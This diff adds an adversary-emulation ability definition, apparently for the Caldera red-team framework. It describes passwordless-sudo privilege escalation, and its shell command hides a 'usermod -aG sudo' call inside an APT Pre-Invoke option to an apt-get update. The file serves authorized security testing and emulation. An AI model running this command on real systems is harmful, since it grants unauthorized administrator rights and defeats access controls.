@@ -1,0 +1,18 @@
+---
+
+- id: 37744f41-89d1-4994-9acd-504272fb0170
+  name: Sudo
+  description: Sudo without password
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1169
+    name: Sudo without password
+  platforms:
+    linux:
+      sh:
+        command: |
+          sudo apt-get update -o APT::Update::Pre-Invoke::='usermod -aG sudo #{comp.user.name}';
+
+  requirements:
+    plugins.stockpile.app.requirements.basic:
+      - source: host.root.noPwd
